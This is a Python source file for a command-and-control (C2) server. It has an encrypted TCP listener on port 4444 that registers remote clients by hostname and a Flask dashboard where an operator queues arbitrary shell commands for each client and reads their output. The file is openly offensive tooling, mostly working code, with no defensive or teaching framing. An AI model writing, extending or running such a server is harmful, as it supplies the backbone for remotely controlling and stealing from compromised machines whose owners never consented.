from flask import Flask, request, render_template, redirect, url_for
from datetime import datetime, timezone
import collections
import html
import base64
import json
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend
import os
import uuid
import socketserver
import threading
import logging

# --- Basic Configuration ---
HOST, PORT = "0.0.0.0", 4444
WEB_UI_PORT = 8080

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Shared State Management ---
class ServerState:
    def __init__(self):
        self.clients = {}  # { 'client_id': {'last_seen': '...', 'info': {...}, 'session_key': b'...'} }
        self.command_queues = collections.defaultdict(list) # { 'client_id': [{'id': '...', 'command': '...'}] }
        self.results = collections.defaultdict(list) # { 'client_id': [{'command_id': '...', 'output': '...', 'error': '...'}] }
        self.lock = threading.Lock()

    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)

    def get_all_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_client(self, client_id, client_info):
        with self.lock:
            self.clients[client_id] = client_info

    def update_client_session_key(self, client_id, key):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['session_key'] = key

    def update_client_last_seen(self, client_id):
        with self.lock:
            if client_id in self.clients:
                self.clients[client_id]['last_seen'] = datetime.now(timezone.utc).isoformat()

    def queue_command(self, client_id, command):
        with self.lock:
            self.command_queues[client_id].append(command)

    def get_next_command(self, client_id):
        with self.lock:
            if self.command_queues[client_id]:
                return self.command_queues[client_id].pop(0)
            return None

    def store_result(self, client_id, result):
        with self.lock:
            self.results[client_id].append(result)
    
    def get_results(self, client_id):
        with self.lock:
            return self.results.get(client_id, [])

    def get_pending_commands(self, client_id):
        with self.lock:
            return self.command_queues.get(client_id, [])


# --- Global Server State ---
server_state = ServerState()

# --- Cryptography ---
rsa_private_key = None
rsa_public_key = None

def initialize_crypto():
    global rsa_private_key, rsa_public_key
    rsa_private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
    rsa_public_key = rsa_private_key.public_key()
    logging.info("RSA key pair generated for secure communication")

def encrypt_aes(data, key):
    iv = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return json.dumps({
        'encrypted_data': base64.b64encode(ciphertext + encryptor.tag).decode('utf-8'),
        'nonce': base64.b64encode(iv).decode('utf-8'),
    }).encode('utf-8')

def decrypt_aes(encrypted_message_bytes, key):
    encrypted_message = json.loads(encrypted_message_bytes)
    encrypted_data_with_tag = base64.b64decode(encrypted_message['encrypted_data'])
    iv = base64.b64decode(encrypted_message['nonce'])
    tag = encrypted_data_with_tag[-16:]
    ciphertext = encrypted_data_with_tag[:-16]
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

# --- TCP Server for C2 Communication ---
class C2TCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.client_id = None
        try:
            logging.info(f"New connection from {self.client_address[0]}")
            
            # 1. Handshake
            if not self.perform_handshake():
                return

            # 2. Session Key Exchange
            if not self.exchange_session_key():
                return

            # 3. Main communication loop
            self.communication_loop()

        except Exception as e:
            logging.error(f"Error handling client {self.client_address[0]}: {e}", exc_info=True)
        finally:
            if self.client_id:
                logging.info(f"Client {self.client_id} disconnected.")

    def read_message(self):
        # This is a simplified implementation. A real-world scenario would need a more robust
        # way to frame messages (e.g., sending length prefixes).
        try:
            data = self.request.recv(8192)
            if not data:
                return None
            return data
        except ConnectionResetError:
            logging.info(f"Connection reset by {self.client_address[0]}")
            return None
        except OSError as e:
            logging.warning(f"Socket error when reading from {self.client_address[0]}: {e}")
            return None

    def send_message(self, data):
        try:
            self.request.sendall(data)
        except ConnectionResetError:
            logging.info(f"Connection reset when sending to {self.client_address[0]}")
            raise
        except OSError as e:
            logging.warning(f"Socket error when sending to {self.client_address[0]}: {e}")
            raise

    def perform_handshake(self):
        handshake_data = self.read_message()
        if not handshake_data: 
            logging.warning(f"No handshake data received from {self.client_address[0]}")
            return False
        
        # Check if this looks like an HTTP request
        if isinstance(handshake_data, bytes) and handshake_data.startswith(b'GET '):
            logging.info(f"HTTP request detected from {self.client_address[0]}, likely a web browser")
            return False
        
        try:
            # Decode bytes to string if necessary
            if isinstance(handshake_data, bytes):
                handshake_str = handshake_data.decode('utf-8')
            else:
                handshake_str = handshake_data
            
            # Check if we received valid JSON data
            if not handshake_str.strip():
                logging.warning(f"Empty handshake data received from {self.client_address[0]}")
                return False
                
            message = json.loads(handshake_str)
        except json.JSONDecodeError as e:
            logging.warning(f"Invalid JSON received during handshake from {self.client_address[0]}: {e}")
            logging.debug(f"Raw data received: {handshake_data}")
            return False
        except UnicodeDecodeError as e:
            logging.warning(f"Unable to decode handshake data from {self.client_address[0]}: {e}")
            return False
        
        if message.get("type") != "handshake_request":
            logging.warning(f"Received non-handshake message during handshake phase from {self.client_address[0]}: {message.get('type')}")
            return False

        client_info_data = message["client_info"]
        self.client_id = f"{client_info_data['hostname']}-{str(uuid.uuid4())[:8]}"
        
        client_info = {
            "last_seen": datetime.now(timezone.utc).isoformat(),
            "info": client_info_data,
            "session_key": None
        }
        server_state.add_client(self.client_id, client_info)
        logging.info(f"Handshake initiated by {self.client_id}")

        public_key_pem = rsa_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        
        response = {
            "type": "handshake_response",
            "public_key_pem": public_key_pem.decode('utf-8'),
            "server_id": "python_c2_v3.0"
        }
        self.send_message(json.dumps(response).encode('utf-8'))
        return True

    def exchange_session_key(self):
        session_key_data = self.read_message()
        if not session_key_data: 
            logging.warning(f"No session key data received from {self.client_id}")
            return False

        try:
            # Decode bytes to string if necessary
            if isinstance(session_key_data, bytes):
                session_key_str = session_key_data.decode('utf-8')
            else:
                session_key_str = session_key_data
            
            # Check if we received valid JSON data
            if not session_key_str.strip():
                logging.warning(f"Empty session key data received from {self.client_id}")
                return False
                
            message = json.loads(session_key_str)
        except json.JSONDecodeError as e:
            logging.warning(f"Invalid JSON received during session key exchange from {self.client_id}: {e}")
            logging.debug(f"Raw data received: {session_key_data}")
            return False
        except UnicodeDecodeError as e:
            logging.warning(f"Unable to decode session key data from {self.client_id}: {e}")
            return False
        
        if message.get("type") != "session_key":
            logging.warning(f"Expected session key from {self.client_id}, but got: {message.get('type')}")
            return False

        encrypted_key_b64 = message["encrypted_aes_key"]
        encrypted_key_bytes = base64.b64decode(encrypted_key_b64)
        aes_key = rsa_private_key.decrypt(encrypted_key_bytes, padding.PKCS1v15())
        
        server_state.update_client_session_key(self.client_id, aes_key)
        logging.info(f"Session key established for {self.client_id}")

        response = {"type": "session_ack", "status": "OK"}
        self.send_message(json.dumps(response).encode('utf-8'))
        self.session_key = aes_key
        return True

    def communication_loop(self):
        while True:
            encrypted_request = self.read_message()
            if not encrypted_request:
                break
            
            try:
                decrypted_payload = decrypt_aes(encrypted_request, self.session_key)
                
                # Ensure we have valid decrypted data
                if not decrypted_payload:
                    logging.warning(f"Empty decrypted payload from {self.client_id}")
                    continue
                    
                message = json.loads(decrypted_payload)
                message_type = message.get("type")

                if message_type == "heartbeat":
                    server_state.update_client_last_seen(self.client_id)
                    response = {"type": "heartbeat_ack", "timestamp": datetime.now(timezone.utc).isoformat()}
                    self.send_encrypted_response(response)

                elif message_type == "command_request":
                    command_obj = server_state.get_next_command(self.client_id)
                    response = {"type": "command_response", "command": command_obj}
                    self.send_encrypted_response(response)

                elif message_type == "command_result":
                    result_data = message.get("result")
                    if result_data:
                        server_state.store_result(self.client_id, result_data)
                        logging.info(f"Received result from {self.client_id} for command {result_data.get('command_id')}")
                        response = {"type": "command_ack", "command_id": result_data.get("command_id")}
                        self.send_encrypted_response(response)

            except Exception as e:
                logging.error(f"Error in communication loop for {self.client_id}: {e}", exc_info=True)
                break

    def send_encrypted_response(self, response_message):
        response_payload = json.dumps(response_message).encode('utf-8')
        encrypted_response = encrypt_aes(response_payload, self.session_key)
        self.send_message(encrypted_response)

# --- Web UI (Flask App) ---
app = Flask(__name__)

@app.route("/")
def index():
    active_clients = server_state.get_all_clients()
    return render_template('index.html', clients=active_clients)

@app.route("/client/<client_id>", methods=["GET", "POST"])
def client_view(client_id):
    if server_state.get_client(client_id) is None:
        return "Client not found", 404

    if request.method == "POST":
        command_text = request.form.get("command")
        if command_text:
            command = {
                "id": str(uuid.uuid4()),
                "command": command_text,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "executed": False
            }
            server_state.queue_command(client_id, command)
        return redirect(url_for('client_view', client_id=client_id))

    client_info = server_state.get_client(client_id)
    client_results = server_state.get_results(client_id)
    pending_commands = server_state.get_pending_commands(client_id)
    
    return render_template('client_view.html',
                           client_id=client_id,
                           info=client_info.get('info', {}),
                           results=reversed(client_results),
                           pending_commands=pending_commands,
                           escape=html.escape)

def run_web_ui():
    # Suppress Flask's default startup message to avoid confusion
    cli = sys.modules['flask.cli']
    cli.show_server_banner = lambda *_: None
    
    logging.info(f"Starting Web UI on http://{HOST}:{WEB_UI_PORT}")
    app.run(host=HOST, port=WEB_UI_PORT)

def setup_html_files():
    # Get the absolute path to the directory containing this script
    script_dir = os.path.dirname(os.path.realpath(__file__))
    templates_dir = os.path.join(script_dir, 'templates')

    # Check if 'templates' directory exists, creating it if necessary.
    if not os.path.exists(templates_dir):
        os.makedirs(templates_dir)

    index_html_path = os.path.join(templates_dir, 'index.html')
    if not os.path.exists(index_html_path):
        index_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Dashboard</title>
    <style>
        body { font-family: sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
        th { background-color: #4CAF50; color: white; }
        tr:nth-child(even) { background-color: #f2f2f2; }
        tr:hover { background-color: #ddd; }
        a { color: #4CAF50; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <h1>C2 Client Dashboard</h1>
    <table>
        <thead>
            <tr>
                <th>Client ID</th>
                <th>Username</th>
                <th>Operating System</th>
                <th>Last Seen (UTC)</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            {% for id, client in clients.items() %}
            <tr>
                <td>{{ id }}</td>
                <td>{{ client.info.username }}</td>
                <td>{{ client.info.operating_system }}</td>
                <td>{{ client.last_seen }}</td>
                <td><a href="{{ url_for('client_view', client_id=id) }}">Interact</a></td>
            </tr>
            {% else %}
            <tr>
                <td colspan="5">No clients have checked in yet.</td>
            </tr>
            {% endfor %}
        </tbody>
    </table>
</body>
</html>
    """
        with open(index_html_path, 'w') as f:
            f.write(index_html)

    client_view_html_path = os.path.join(templates_dir, 'client_view.html')
    if not os.path.exists(client_view_html_path):
        client_view_html = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Interact with {{ client_id }}</title>
    <style>
        body { font-family: sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
        h1, h2 { color: #4CAF50; }
        a { color: #4CAF50; }
        .container { max-width: 900px; margin: auto; }
        .info-box, .command-box, .results-box { background: white; padding: 20px; margin-bottom: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        pre { background: #eee; padding: 10px; border: 1px solid #ddd; white-space: pre-wrap; word-wrap: break-word; }
        input[type="text"] { width: 70%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #45a049; }
        hr { border: 0; height: 1px; background: #ddd; }
        .command-item { list-style-type: none; padding: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <p><a href="{{ url_for('index') }}">&larr; Back to Dashboard</a></p>
        <h1>Client: {{ client_id }}</h1>

        <div class="info-box">
            <h2>Client Information</h2>
            <pre>{{ info | tojson(indent=4) }}</pre>
        </div>

        <div class="command-box">
            <h2>Issue Command</h2>
            <form method="post">
                <input type="text" name="command" placeholder="Enter shell command" autofocus required>
                <button type="submit">Send Command</button>
            </form>
            {% if pending_commands %}
                <h3>Pending Commands</h3>
                <ul>
                {% for cmd in pending_commands %}
                    <li class="command-item"><code>{{ escape(cmd.command) }}</code> (ID: {{ cmd.id[:8] }})</li>
                {% endfor %}
                </ul>
            {% endif %}
        </div>

        <div class="results-box">
            <h2>Command History</h2>
            {% for r in results %}
                <p>
                    <b>Command ID:</b> <code>{{ r.command_id[:8] }}</code><br>
                    <b>Executed at (UTC):</b> {{ r.timestamp }}
                </p>
                <pre>{{ escape(r.output) }}</pre>
                {% if r.error %}
                    <pre style="color: red;"><b>Error:</b> {{ escape(r.error) }}</pre>
                {% endif %}
                <hr>
            {% else %}
                <p>No results from this client yet.</p>
            {% endfor %}
        </div>
    </div>
    <script>
        // Auto-refresh the page every 10 seconds to check for new results
        setInterval(function() {
            // Don't refresh if the user is currently typing a command
            if (!document.querySelector('input[name="command"]:focus')) {
                window.location.reload();
            }
        }, 10000);
    </script>
</body>
</html>
    """
        with open(client_view_html_path, 'w') as f:
            f.write(client_view_html)

if __name__ == "__main__":
    import sys
    initialize_crypto()
    setup_html_files()

    # Start the Flask Web UI in a separate thread
    web_thread = threading.Thread(target=run_web_ui, daemon=True)
    web_thread.start()

    # Start the C2 TCP server
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer((HOST, PORT), C2TCPHandler) as server:
        logging.info(f"C2 server listening on {HOST}:{PORT}")
        server.serve_forever()
